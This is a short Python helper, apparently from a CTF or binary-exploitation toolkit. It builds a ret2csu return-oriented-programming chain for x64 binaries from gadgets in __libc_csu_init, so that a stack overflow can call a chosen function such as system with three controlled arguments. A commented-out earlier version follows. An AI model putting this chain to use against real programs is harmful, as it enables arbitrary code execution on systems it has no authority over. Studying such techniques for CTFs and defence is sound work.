from typing import List


def gadget_by_csu(libc_csu_init_address: int, func_to_call: int, param1: int, param2: int, param3: int, ret_addr: int = None) -> List:
    '''
    can used in `x64-little` with csu_init function in it.
    exploit csu_init's gadgets
    YOU SHOULD USE IT FROM EBP POSITION OVERFLOW

    libc_csu_init_address:int the start-address of __libc_csu_init
    func_to_call:int function address , etc. write_got , system_got
    param1/2/3:int address of func's params (rdi,rsi,rdx)
    '''
    offset_to_start = 0x40
    offset_gadgets1_to_gadgets2 = 0x16
    gadgets_1 = libc_csu_init_address + offset_to_start
    gadgets_2 = gadgets_1 + offset_gadgets1_to_gadgets2

    p = [
        ['p64', gadgets_2],
        ['fakeebp', 64],
        ['p64', 0],
        ['p64', 1],  # rbx = 0 , rbp = 1
        ['p64', func_to_call],
        ['p64', param3],
        ['p64', param2],
        ['p64', param1],
        ['p64', gadgets_1],
    ]
    p += ([['fakeebp', 64]] * 7)
    if ret_addr:
        p.append(['p64', ret_addr])
    return p

#     offset_to_start = 0x24
#     offset_gadgets1_to_gadgets2 = 0x16
#     gadgets_1 = __libc_csu_init_end - offset_to_start
#     gadgets_2 = gadgets_1 + offset_gadgets1_to_gadgets2

#     padding_1 = fakeebp() * 7
#     p = p00(gadgets_2) + fakeebp() + p00(0) + p00(1)  # rbx = 0 , rbp = 1
#     p += p00(func_to_call) + p00(param3) + p00(param2) + p00(param1)
#     p += p00(gadgets_1) + padding_1
#     if ret_addr:
#         p += p00(ret_addr)
#     return p
